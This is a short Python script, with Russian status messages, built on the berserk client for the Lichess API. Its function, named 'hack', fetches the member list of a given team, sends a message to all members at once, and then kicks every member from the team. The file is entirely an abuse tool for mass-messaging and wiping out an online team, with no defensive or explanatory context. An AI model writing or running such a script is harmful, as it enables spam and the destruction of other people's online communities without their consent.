import berserk
import ndjson
import requests

from config import *


def hack(team):
    session = berserk.TokenSession(TOKEN)
    client = berserk.Client(session=session)

    r = requests.get(f'https://{SERVER}/{API}/{TEAM}/' + team + f'/{USERS}')
    data = r.json(cls=ndjson.Decoder)

    print(green + "[+] Список пользователей получен!")

    session.post(f'https://{SERVER}/{TEAM}/' + team + f'/{PM_ALL}', data={'message': msg}, headers=HEADS).json()
    print("[+] Рассылка успешна отправлена!")

    for i in data:
        user = i[f'{JSON_USERNAME}']
        client.teams.kick_member(team, user)
        print(f"[+] {user} кикнут!")


if __name__ == "__main__":
    hack(team=input(magenta + "[?] ID команды: " + white))
